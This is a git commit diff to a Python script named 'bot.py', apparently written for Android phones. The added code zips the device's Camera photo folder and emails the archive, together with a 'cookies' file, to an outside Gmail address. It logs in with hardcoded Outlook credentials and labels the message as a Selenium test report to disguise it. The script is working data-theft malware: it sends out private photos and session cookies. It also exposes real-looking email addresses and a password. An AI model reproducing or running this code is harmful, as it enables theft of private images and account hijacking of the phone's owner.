34d9cd872280f7b3aaddc5f9f08b7518e9adefe6
alitariq01 <84877800+alitariq01@users.noreply.github.com>
2021-07-20 11:26:16 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,26 +1,42 @@
 import smtplib
-from email.mime.multipart import MIMEMultipart
+import os
 from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-fromaddr = "ibrahim.tariq.36@outlook.com"
+from email.mime.multipart import MIMEMultipart 
+from email.mime.application import MIMEApplication
+import zipfile
+import shutil
+def zipdir(path, ziph):
+	for root, dirs, files in os.walk(path):
+		for file in files:
+			ziph.write(os.path.join(root, file), 
+			os.path.relpath(os.path.join(root, file), 
+			os.path.join(path, '..'))) 
+zipf = zipfile.ZipFile('test.zip', 'w', zipfile.ZIP_DEFLATED) 
+zipdir('/storage/emulated/0/DCIM/Camera', zipf) 
+zipf.close()
+orginal = '/storage/emulated/0/test.zip'
+path = '/storage/emulated/0/Download/btc/'
+shutil.move(orginal, path)
+email = "jourge.55@outlook.com"
+password = 'zzxcv123$'
 toaddr = "zalborasi@gmail.com"
+dir_path = "/storage/emulated/0/Download/btc"
+files = ["test.zip", "cookies"]
 msg = MIMEMultipart()
-msg['From'] = fromaddr
-msg['To'] = toaddr
-msg['Subject'] = "Subject of the Mail"
-body = "Body_of_the_mail"
-msg.attach(MIMEText(body, 'plain'))
-filename = "File_name_with_extension"
-attachment = open("/storage/emulated/0/Download/cookies", "rb") 
-p = MIMEBase('application', 'octet-stream')
-p.set_payload((attachment).read()) 
-encoders.encode_base64(p) 
-p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-msg.attach(p) 
-s = smtplib.SMTP('smtp.outlook.com', 587) 
-s.starttls()
-s.login(fromaddr, "zzxcv123$") 
-text = msg.as_string() 
-s.sendmail(fromaddr, toaddr, text) 
-s.quit() 
+msg['To'] = "zalborasi@gmail.com" 
+msg['From'] = "jourge.55@outlook.com" 
+msg['Subject'] = "Selenium ClearCore_Regression_Test_Report_Result" 
+body = MIMEText('Test results attached.', 'html', 'utf-8')
+msg.attach(body) # add message body (text or html)
+for f in files:
+	file_path = os.path.join(dir_path, f) 
+	attachment = MIMEApplication(open(file_path, "rb").read(), _subtype="txt") 
+	attachment.add_header('Content-Disposition','attachment', filename=f)
+	msg.attach(attachment)
+	s = smtplib.SMTP("smtp.outlook.com", 587)
+	s.starttls()
+	s.login(email, password)
+	s.sendmail(email, toaddr, msg.as_string())
+	s.quit()
+	print ('done!')
+	s.close()
